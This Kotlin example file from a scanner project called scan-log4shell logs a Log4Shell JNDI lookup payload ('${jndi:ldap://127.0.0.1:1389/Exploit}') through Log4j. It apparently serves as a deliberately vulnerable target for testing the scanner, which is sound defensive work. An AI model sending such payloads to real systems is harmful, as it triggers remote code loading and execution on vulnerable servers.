/*
 * Copyright (c) 2021.
 *
 * This file is part of scan-log4shell.
 *
 * scan-log4shell is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * scan-log4shell is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with Foobar.  If not, see <https://www.gnu.org/licenses/>.
 */

package de.fenste.log4shell.example

import org.apache.logging.log4j.LogManager

private val LOGGER = LogManager.getLogger("AffectedProgram")

fun main() {
    LOGGER.info("\${jndi:ldap://127.0.0.1:1389/Exploit}")
}
